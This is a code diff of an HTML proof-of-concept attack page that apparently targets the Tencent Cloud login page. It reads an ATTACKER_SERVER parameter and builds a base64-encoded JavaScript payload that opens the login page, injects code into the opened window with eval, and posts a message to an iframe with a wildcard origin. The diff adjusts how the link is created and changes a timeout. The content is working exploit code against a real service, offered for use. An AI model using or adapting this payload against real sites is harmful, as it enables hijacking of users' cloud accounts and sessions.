@@ -7,10 +7,11 @@
       let ATTACKER_SERVER = new URLSearchParams(location.search).get(
         "ATTACKER_SERVER"
       );
-      let payload = btoa(`document.body.innerHTML +=
-  '<a href="https://intl.cloud.tencent.com/account/login/?sa-visual-mode=true" target="_blank" id="openerAnchor"></a>';
-
-var link = document.getElementById("openerAnchor");
+      let payload = btoa(`var link=document.createElement('a')
+     link.href="https://intl.cloud.tencent.com/account/login/?sa-visual-mode=true"
+     link.innerHTML="click HEre!"
+     link.target="_blank"
+     document.body.appendChild(link)
 var win;
 link.onclick = function () {
   win = window.open(link.href, "_blank");
@@ -19,7 +20,7 @@ link.onclick = function () {
 
 link.click();
 
-win.onload = () => {
+
     
   win.eval(\`var interv = setInterval(() => {
     var btn = document.getElementsByClassName(
@@ -39,7 +40,7 @@ win.onload = () => {
       };
     }
   }, 500);\`)
-};
+
 `);
 
 
@@ -56,7 +57,7 @@ win.onload = () => {
 
       setTimeout(function () {
         iframe.contentWindow.postMessage(msg, "*");
-      }, 4000);
+      }, 6000);
     </script>
   </head>
   <body>
